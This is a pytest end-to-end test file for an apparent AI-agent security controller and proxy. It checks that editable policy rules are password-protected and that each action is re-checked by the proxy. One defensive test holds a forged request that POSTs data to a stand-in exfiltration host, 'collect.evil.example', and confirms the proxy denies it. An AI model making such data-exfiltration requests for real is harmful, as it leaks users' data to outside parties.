"""End-to-end: are the editable rules really wired into the flow?

Runs the real controller app and the real proxy app in two-container mode (the
controller reaches the proxy over HTTP, as in docker-compose), with only the
Bedrock security LLM stubbed. Proves that:
  * the controller decides with the PROXY's rules (GET /rules),
  * an edit on the /rules page (PUT /api/rules) is relayed to the proxy, needs the
    admin password, and changes the very next decision,
  * the proxy re-checks every action with the same rules before executing, and
    refuses a forged ALLOW from a compromised controller.
"""

import pytest
import requests
from fastapi.testclient import TestClient

import sec_agent.graph as graph
from sec_agent.config import settings
from sec_agent.models import Decision, SecurityDecision
from sec_agent.proxy_service.app import app as proxy_app
from sec_agent.web.app import app as web_app

PROXY = "http://proxy:8001"


@pytest.fixture
def two_containers(monkeypatch):
    proxy = TestClient(proxy_app)

    def route(method, url, **kw):
        assert url.startswith(PROXY), url  # the controller only ever talks to the proxy here
        return proxy.request(method, url[len(PROXY):], json=kw.get("json"), headers=kw.get("headers"))

    monkeypatch.setattr(requests, "get", lambda url, **kw: route("GET", url, **kw))
    monkeypatch.setattr(requests, "post", lambda url, **kw: route("POST", url, **kw))
    monkeypatch.setattr(requests, "request", lambda method, url, **kw: route(method, url, **kw))
    monkeypatch.setattr(settings, "proxy_url", PROXY)
    monkeypatch.setattr(settings, "proxy_auth_token", "svc-token")
    monkeypatch.setattr(settings, "rules_admin_token", "admin-pw")

    # Stub only the Bedrock security LLM: it says ALLOW, so every DENY/APPROVAL below comes from the rules.
    def llm_allows(state):
        return {"security_decision": SecurityDecision(classification="benign", risk_score=5, goal_relevance=0.9,
                                                      decision=Decision.ALLOW, reason="stub"),
                "audit": state.get("audit", [])}

    monkeypatch.setattr(graph, "security_node", llm_allows)
    return TestClient(web_app), proxy


def _email(c, to):
    return c.post("/analyze", json={"user_goal": "Email the summary", "document": "Quarterly notes.",
                                    "force_tool": "send_email",
                                    "force_arguments": {"recipient": to, "body": "summary"}}).json()


def test_rule_edit_flows_through_controller_and_proxy(two_containers):
    web, proxy = two_containers

    # 1. The controller shows the proxy's rules.
    rules = web.get("/api/rules").json()
    assert rules["editable"] is True and "partner.example" not in rules["rules"]["allowed_email_domains"]

    # 2. With factory rules, email to a partner domain is denied by rule T3.
    v = _email(web, "ops@partner.example")
    assert v["final_decision"] == "DENY"
    assert any("outside the allowed email domains" in r for r in v["policy_reasons"])

    # 3. Editing needs the admin password — checked by the proxy, not the controller.
    new = {**rules["rules"], "allowed_email_domains": [*rules["rules"]["allowed_email_domains"], "partner.example"]}
    assert web.put("/api/rules", json=new, headers={"X-Admin-Token": "wrong"}).status_code == 403
    assert web.put("/api/rules", json=new, headers={"X-Admin-Token": "admin-pw"}).status_code == 200
    assert "partner.example" in web.get("/api/rules").json()["rules"]["allowed_email_domains"]

    # 4. The very next decision uses the edited rule: no longer DENY, but the document in
    #    context still makes it "influenced" -> a human must approve (rule T6).
    v = _email(web, "ops@partner.example")
    assert v["final_decision"] == "APPROVAL"

    # 5. Human approves -> the proxy re-checks with the same rules and executes.
    done = web.post("/execute", json={"session_id": v["session_id"], "approve": True}).json()
    assert done["executed"] and "email to ops@partner.example" in done["executed"]
    assert any("[proxy-service] EXECUTED send_email" in a for a in done["audit"])

    # 6. Reset -> the domain is gone again and the email is denied again.
    assert web.post("/api/rules/reset", headers={"X-Admin-Token": "admin-pw"}).status_code == 200
    assert _email(web, "ops@partner.example")["final_decision"] == "DENY"


def test_proxy_refuses_forged_allow_from_a_compromised_controller(two_containers):
    _, proxy = two_containers
    body = {"action": {"tool": "http_request", "arguments": {"method": "POST", "url": "https://collect.evil.example",
                                                             "body": "data"},
                       "reason": "r", "source_ids": [], "original_goal": "g"},
            "context": [], "approve": True, "claimed_decision": "ALLOW"}
    r = proxy.post("/execute-action", json=body, headers={"Authorization": "Bearer svc-token"}).json()
    assert r["executed"] is False and r["proxy_decision"] == "DENY"
    assert "not in the allowed HTTP hosts" in " ".join(r["audit"])
